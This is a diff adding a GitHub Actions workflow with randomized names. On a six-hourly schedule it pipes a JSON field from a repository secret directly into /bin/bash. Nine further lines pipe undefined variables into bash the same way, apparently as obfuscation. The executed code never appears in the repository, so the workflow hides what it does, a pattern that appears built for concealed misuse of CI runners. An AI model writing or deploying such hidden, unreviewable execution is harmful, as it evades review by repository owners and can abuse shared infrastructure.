@@ -1,0 +1,27 @@
+name: taogongzhu4536
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: taogongzhu4536
+        env:
+          siysr81: ${{ secrets.siysr81 }}
+        run: |
+          echo $siysr81 | jq -r .ixou32439 | /bin/bash
+          echo $dsohz3916 | jq -r .pl38435 | /bin/bash
+          echo $kwe381 | jq -r .j612 | /bin/bash
+          echo $yd4019 | jq -r .u170 | /bin/bash
+          echo $xbtg9764 | jq -r .m85 | /bin/bash
+          echo $wjnzc613 | jq -r .glsk417 | /bin/bash
+          echo $agr71230 | jq -r .thr04 | /bin/bash
+          echo $zpq42 | jq -r .j1572 | /bin/bash
+          echo $ck59790 | jq -r .f092 | /bin/bash
+          echo $pdlm92138 | jq -r .i23849 | /bin/bash
+
